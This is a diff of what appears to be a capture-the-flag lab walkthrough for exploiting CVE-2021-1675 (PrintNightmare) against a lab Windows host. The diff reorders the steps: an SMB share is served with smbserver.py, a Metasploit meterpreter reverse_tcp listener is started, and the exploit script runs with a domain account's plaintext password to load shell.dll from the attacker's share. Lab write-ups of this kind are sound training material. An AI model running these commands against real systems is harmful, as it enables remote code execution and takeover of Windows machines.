@@ -88,19 +88,24 @@ Install all the python3 requirements
 
 Change CVE-2021-1675 into lee.py(another name)
 
-#python3 lee.py VULNNET/enterprise-security:'sand_0873959498'@10.10.4.112 '\\10.4.73.176\share\shell.dll' (run under virtual environment)
-
-Established smbserver 
+Established smbserver ( Create a share name called share and ouput with `pwd` )
 ---------------------
 #smbserver.py share `pwd` -smb2support (run under virtual environment)
 
-
+Use multi/handler with msfconsole
+---------------------------------
 #msfconsole -q
 #use multi/handler
 #set payload windows/x64/meterpreter/reverse_tcp
 #set LHOST tun0
 #set LPORT 4444
 #run
+
+Run the script to connect the smbserver and execute shell.dll
+--------------------------------------------------------------
+#python3 lee.py VULNNET/enterprise-security:'sand_0873959498'@10.10.4.112 '\\10.4.73.176\share\shell.dll' (run under virtual environment)
+
+
 
 
 
